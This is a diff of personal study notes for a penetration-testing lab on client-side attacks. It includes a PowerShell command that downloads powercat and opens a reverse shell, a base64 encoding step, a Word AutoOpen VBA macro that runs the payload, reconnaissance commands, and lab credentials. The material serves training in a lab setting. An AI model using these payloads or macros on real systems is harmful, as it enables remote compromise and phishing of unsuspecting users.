@@ -130,33 +130,24 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://1
 ```
 - Name shortcut  **automatic_configuration**
 - Copy the file to the VM#2 `smbclient //192.168.205.195/share -c 'put config.Library-ms'`
-
-
-```
-
-
+---
 # Labs
 12.1.1 Q1 
+```
 gobuster dir -u 192.168.205.197 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x .pdf -t 20 
 exiftool -a -u info.pdf
-
+```
 12.1.2 Q1  : Canary token created : http://canarytokens.com/feedback/51yhmhq24v0uumkrl9v7cmaw2/contact.php
-
-
+---
 12.2.3 Q1 /Q2 : 
 192.168.205.196 client-side-Attacks - Microsoft Word Macro - VM #1 OS Credentials:
 192.168.205.198 client-side-Attacks - Microsoft Word Macro - VM #2 OS Credentials:
-1. Perform the steps from this section to create a malicious Word document containing a macro with the name **MyMacro** on the _OFFICE_ (VM #1) machine. For this, you have to install Microsoft Office on VM #1 again as outlined in the section "Installing Microsoft Office". Confirm that the macro works as expected by obtaining a reverse shell from the _OFFICE_ machine. We can log in with offsec:lab. What keyword is used to declare a variable in VBA?
-2. 
-3. Once you have confirmed that the macro from the previous exercise works, upload the document containing the macro _MyMacro_ in the file upload form (port 8000) of the _TICKETS_ (VM #2) machine with the name **ticket.doc**. A script on the machine, simulating a user, checks for this file and executes it. After receiving a reverse shell, enter the flag from the **flag.txt** file on the desktop for the _Administrator_ user. For the file upload functionality, add **tickets.com** with the corresponding IP address in **/etc/hosts**. Please note that it can take up to three minutes after uploading the document for the macro to get executed.
 ```
 $Text = 'IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.45.158/powercat.ps1");powercat -c 192.168.45.158 -p 4444 -e powershell'
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 $EncodedText =[Convert]::ToBase64String($Bytes)
 $EncodedText
-
 ```
-
 
 ```powershell
 Sub AutoOpen()
@@ -182,7 +173,7 @@ Str = Str + "CQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
     CreateObject("Wscript.Shell").Run Str
 End Sub
 ```
-
+---
 12.3.1 Q1 
 192.168.205.194   VM1
 192.168.205.195   VM2
@@ -196,7 +187,7 @@ smbclient //192.168.50.195/share -c 'put config.Library-ms'
 smbclient //192.168.205.195/share 
 put config.Library-ms
 ```
-
+---
 12.3.1 Q3 
 192.168.205.194   VM3
 192.168.205.199  VM4
@@ -209,10 +200,6 @@ PORT    STATE SERVICE REASON          VERSION
 | smtp-vuln-cve2010-4344: 
 |_  The SMTP server is not Exim: NOT VULNERABLE
 Service Info: Host: ADMIN; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-feroxbuster -u http://192.168.205.199/ -t 100 -x "txt,pdf" -k -q  -d 2 
-http://192.168.205.199/info.pdf
-
 
 Found info.pdf at : feroxbuster -u http://192.168.205.199/ -t 100 -x "txt,pdf" -k -q  -d 2 
 
@@ -231,9 +218,7 @@ Producer                        : Microsoft® PowerPoint® for Microsoft 365
 Creator                         : Dave Wizard
 ```
 Dave.Wizard@supermagicorg.com
-
 our username is : test@supermagicorg.com   password test
-
 
 ```bash
 
